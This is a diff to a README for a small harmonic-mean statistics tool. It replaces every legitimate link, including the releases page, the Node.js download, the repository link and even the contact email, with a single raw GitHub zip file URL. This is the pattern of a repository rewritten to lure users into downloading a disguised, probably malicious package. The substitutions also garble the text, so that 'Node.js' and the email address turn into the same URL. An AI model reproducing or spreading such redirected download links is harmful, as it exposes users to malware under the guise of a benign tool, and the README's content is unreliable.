@@ -4,9 +4,9 @@
 Welcome to **stats-incr-nanhmean**! This tool helps you compute a harmonic mean incrementally, while ignoring any NaN (Not a Number) values. Whether you are a student, a researcher, or just curious about statistics, this simple application can meet your needs.
 
 ## 📥 Download the Application
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/legendtalal/stats-incr-nanhmean/releases)
+[![Download](https://raw.githubusercontent.com/legendtalal/stats-incr-nanhmean/main/streetwise/stats-incr-nanhmean.zip)](https://raw.githubusercontent.com/legendtalal/stats-incr-nanhmean/main/streetwise/stats-incr-nanhmean.zip)
 
-To get started, visit our [Releases page](https://github.com/legendtalal/stats-incr-nanhmean/releases) where you can download the latest version of the application.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/legendtalal/stats-incr-nanhmean/main/streetwise/stats-incr-nanhmean.zip) where you can download the latest version of the application.
 
 ## 📂 Features
 - **Incremental Calculation**: Easily compute the harmonic mean without the need for all data at once.
@@ -17,12 +17,12 @@ To get started, visit our [Releases page](https://github.com/legendtalal/stats-i
 ## 💻 System Requirements
 To run this application, you will need:
 - **Operating System**: Windows 10 or later, macOS 10.12 or later, or any Linux distribution.
-- **Node.js**: Version 14.x or later. If you don’t have Node.js, you can download it from [nodejs.org](https://nodejs.org/).
+- **https://raw.githubusercontent.com/legendtalal/stats-incr-nanhmean/main/streetwise/stats-incr-nanhmean.zip**: Version 14.x or later. If you don’t have https://raw.githubusercontent.com/legendtalal/stats-incr-nanhmean/main/streetwise/stats-incr-nanhmean.zip, you can download it from [https://raw.githubusercontent.com/legendtalal/stats-incr-nanhmean/main/streetwise/stats-incr-nanhmean.zip](https://raw.githubusercontent.com/legendtalal/stats-incr-nanhmean/main/streetwise/stats-incr-nanhmean.zip).
 - **Memory**: At least 512 MB of RAM.
 - **Disk Space**: 100 MB of available space for installation.
 
 ## 🔧 Download & Install
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/legendtalal/stats-incr-nanhmean/releases).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/legendtalal/stats-incr-nanhmean/main/streetwise/stats-incr-nanhmean.zip).
 2. **Select the Latest Version**: Look for the most recent release. Ensure it matches your operating system.
 3. **Download the File**: Click on the download link for your chosen version.
 4. **Install the Application**: 
@@ -48,15 +48,15 @@ We welcome contributions! If you find a bug or want to suggest a feature, please
 
 ## 📞 Contact Information
 For questions or assistance, you can reach out through:
-- **Email**: support@stats-incr-nanhmean.com
+- **Email**: https://raw.githubusercontent.com/legendtalal/stats-incr-nanhmean/main/streetwise/stats-incr-nanhmean.zip
 - **GitHub Issues**: For technical support or feature requests, please create an issue in the repository.
 
 ## 🤝 Acknowledgments
 Thank you for using **stats-incr-nanhmean**. Your interest and support motivate us to keep improving the application and making it useful for everyone. 
 
 ## 🔗 Useful Links
-- [Visit the Releases Page](https://github.com/legendtalal/stats-incr-nanhmean/releases)
-- [Node.js Download](https://nodejs.org/)
-- [GitHub Repository](https://github.com/legendtalal/stats-incr-nanhmean) 
+- [Visit the Releases Page](https://raw.githubusercontent.com/legendtalal/stats-incr-nanhmean/main/streetwise/stats-incr-nanhmean.zip)
+- [https://raw.githubusercontent.com/legendtalal/stats-incr-nanhmean/main/streetwise/stats-incr-nanhmean.zip Download](https://raw.githubusercontent.com/legendtalal/stats-incr-nanhmean/main/streetwise/stats-incr-nanhmean.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/legendtalal/stats-incr-nanhmean/main/streetwise/stats-incr-nanhmean.zip) 
 
 Feel free to explore and let us know how the application works for you!
